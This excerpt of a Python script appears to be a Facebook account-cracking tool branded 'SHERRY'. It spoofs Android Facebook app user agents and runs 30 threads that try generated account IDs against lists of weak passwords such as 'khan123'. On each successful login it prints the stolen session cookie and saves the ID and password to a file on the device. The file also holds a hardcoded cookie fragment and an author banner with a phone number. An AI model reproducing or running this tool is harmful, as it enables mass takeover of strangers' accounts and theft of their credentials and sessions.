...
os.system("xdg-open https://www.facebook.com/profile.php?id=100086602723566&mibextid=ZbWKwL")
import uuid
...
#Mozilla/5.0 (Linux; Android 13; Redmi Note 10 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36
   ...
   #NEW#AGENT
    ...
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
agent = {"Dalvik/2.1.0 (Linux; U; Android 10.0.1; Redmi Note 5 Pro Build/RD1A.201105.003.C1) [FBAN/MobileAdsManagerAndroid;FBAV/335.0.0.30.47;FBBV/489275666;FBDM/{density=2.75,width=720,height=1600};FBLC/en_US;FBRV/0;FBCR/Zong;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 5 Pro;FBSV/7.2;FBOP/1;FBCA/x86:armeabi-v7a;]"}
logo = """

.d8888. db   db d88888b d8888b. d8888b. db    db 
88'  YP 88   88 88'     88  `8D 88  `8D `8b  d8' 
`8bo.   88ooo88 88ooooo 88oobY' 88oobY'  `8bd8'  
  `Y8b. 88~~~88 88~~~~~ 88`8b   88`8b      88    
db   8D 88   88 88.     88 `88. 88 `88.    88    
`8888Y' YP   YP Y88888P 88   YD 88   YD    YP    
                      
====================================================
[â€¢] 𝐎𝐖𝐍𝐄𝐑     : 𝐒𝐇𝐄𝐑𝐑𝐘_𝐊𝐈𝐍𝐆
[â€¢] 𝐆𝐈𝐓𝐇𝐔𝐁    : 𝐒𝐇𝐄𝐑𝐑𝐘_404 
[â€¢] 𝐍𝐔𝐌𝐁𝐄𝐑  : 03475501303
[â€¢] 𝐒𝐓𝐀𝐓𝐔𝐒    : 𝐅𝐑𝐄𝐄
[â€¢] 𝐕𝐄𝐑𝐒𝐈𝐎𝐍   : 2.3
===================================================="""
...
cps = []
try:
    print('\n\033[1;37m[•] WAIT SOMETIMES CHECKING FOR UPDATE')
...
def ali_khan():
	...
	with ThreadPool(max_workers=30) as yaari:
		...
		for guru in user:
			uid = kode+guru
			pwx = [guru,'khankhan','khan1122','khan12','khan123','ali12345','pak123','khan786']
			yaari.submit(fcrack,uid,pwx,tl)
	print('[✓] Crack process has been completed')
...
def fcrack(uid,pwx,tl):
    ...
    # 'cookie': 'datr=eDyuZLrQ76FXJUhnPMUHJrj0; sb=eDyuZG2cRWGQjmope1THrtwG; m_pixel_ratio=2; wd=360x666; fr=07vJGRdUDtbWI2iFQ..Bkrjx4.2d.AAA.0.0.BkrjyH.AWX6V9mofpA',
    ...
    'user-agent': pro}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\033[1;32m[𝐒𝐇𝐄𝐑𝐑𝐘-OK] '+uid+'|'+ps+'\033[0;97m\n[‎‎🍁]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
                open('/sdcard/𝐒𝐇𝐄𝐑𝐑𝐘-OK.txt', 'a').write(cid+' | '+ps+ '\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:152]
               # print('\033[1;33m[𝐒𝐇𝐄𝐑𝐑𝐘-CP] '+cid+' | '+ps+'\x1b[1;97m')
            #    open('SHERRY-CP.txt', 'a').write(cid+' | '+ps+'\n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r[\033[1;97m𝐒𝐇𝐄𝐑𝐑𝐘\033[1;97m] %s|\33[1;32mOK:- %s\r'%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
